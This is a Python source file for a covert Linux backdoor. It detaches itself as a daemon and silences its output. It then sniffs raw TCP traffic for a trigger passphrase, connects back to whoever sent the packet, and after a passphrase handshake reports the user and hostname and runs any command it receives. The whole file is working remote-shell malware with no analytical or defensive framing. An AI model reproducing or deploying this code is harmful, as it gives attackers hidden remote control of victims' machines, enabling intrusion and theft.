#!/usr/bin/python3

import socket, os, getpass, subprocess, platform, sys
from struct import *


def backdoorSysInfo(skt):
	command = skt.recv(1024)
	prompt = []
	if type(command) == bytes:
		command=command.decode("utf-8")
	if command.strip() == "Report":
		p = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		out, err = p.communicate()
		user = out.strip().decode("utf-8")
		prompt.append(user+"@")
		prompt.append(platform.dist()[0]+":")
		separator = "$"
		if user == "root":
			separator = "#"
		prompt.append(separator)
		prompt = "".join(prompt)
		skt.send(str.encode(prompt))
	command = skt.recv(1024)
	if type(command) == bytes:
		command=command.decode("utf-8")
	if command.strip() == "Location":
		proc = os.popen("pwd")
		location = ""
		for i in proc.readlines():
			location += i
		location = location.strip()
		skt.send(str.encode(location))
	return

def backdoorCmd(skt, command):

	try:
		proc = os.popen(command) # counterpart : can't have any error message
		output = ""
		for i in proc.readlines():
			output += i
		output = output.strip()
		if output == "":
			output = "daemonnoreport" #send this to avoid troublesome padding
		skt.send(str.encode(output))
		# Equivalent using subprocess but has trouble with chained commands
	except Exception as err:
		print(err.args)
		skt.send(str.encode("Error : command '"+command+"' not found"))

def backdoorSniffer():
	skt = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
	while True:
		pkt = skt.recvfrom(65535)
		#packet string from tuple
		pkt = pkt[0]
		#take first 20 characters for the ip header
		ipHeader = pkt[0:20]
		#now unpack 
		iph = unpack('!BBHHHBBH4s4s' , ipHeader)
		saddr = socket.inet_ntoa(iph[8])
		daddr = socket.inet_ntoa(iph[9])
		versionIhl = iph[0]
		version = versionIhl >> 4
		ihl = versionIhl & 0xF
		iphLength = ihl*4
		tcpHeader = pkt[iphLength:iphLength+20]
		tcph = unpack('!HHLLBBHHH' , tcpHeader)
		sport = tcph[0]
		dport = tcph[1]
		doffReserved = tcph[4]
		tcphLength = doffReserved >> 4  
		hSize = iphLength + tcphLength*4
		dataSize = len(pkt) - hSize
		 
		#get data from the packet
		data = pkt[hSize:]
		try:
			if type(data) == bytes:
				data = data.decode("utf-8")
			if data == "passphrase1":
				if type(saddr) == bytes:
					saddr = saddr.decode("utf-8")
				if type(sport) == bytes:
					sport = sport.decode("utf-8")
				return saddr, sport, daddr, dport
		except:
			pass

def backdoorInit():

	skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	daddr, dport, saddr, sport = backdoorSniffer()
	try:
		skt.bind((saddr, sport))
		skt.connect((daddr, dport))
	except:
		return None
	command = skt.recv(1024)
	if type(command)==bytes:
		command=command.decode("utf-8")
	if command.strip() == "passphrase2":
		skt.send(b"passphrase3")
		
		return skt
	else:
		return None
		

def backdoorShell(skt):
	while True:
		try:
			command = skt.recv(1024)
			if type(command)==bytes:
				command=command.decode("utf-8")
			if command.strip().split()[0] == "cd":
				os.chdir(command.strip("cd "))
				backdoorCmd(skt, "pwd")
			elif command.strip().lower() == "exit":
				skt.send(b"exited")
				skt.close()
				break
			elif command.strip().lower() == "release":
				skt.send(b"released")
				skt.close()
				return False
			else:
				backdoorCmd(skt, command)

		except Exception:
			skt.send(b"Error: An unexpected error has occured")
	return True

def backdoor():
	while True:
		skt = backdoorInit()
		if skt == None:
			continue
		backdoorSysInfo(skt)
		if not backdoorShell(skt):
			break
	return

def daemonise():
	stdin = '/dev/null'
	stdout = '/dev/null'
	stderr = '/dev/null'
	# perform first fork
	try:
		pid = os.fork()
		if pid > 0:
			sys.exit(0) # exit first parent
	except OSError as e:
		print(e.args)
		sys.exit(1)
	# decouple from parent environment
	os.chdir("/")
	os.umask(0)
	os.setsid()
	# perform second fork
	try:
		pid = os.fork( )
		if pid > 0:
			sys.exit(0) # exit second parent
	except OSError as e:
		print(e.args)
		sys.exit(1)
	# the process is now daemonised, redirect standard file descriptors
	for f in sys.stdout, sys.stderr:
		f.flush( )
	si = open(stdin, 'r')
	so = open(stdout, 'a+')
	se = open(stderr, 'a+')
	os.dup2(si.fileno( ), sys.stdin.fileno( ))
	os.dup2(so.fileno( ), sys.stdout.fileno( ))
	os.dup2(se.fileno( ), sys.stderr.fileno( ))
	backdoor()

daemonise()
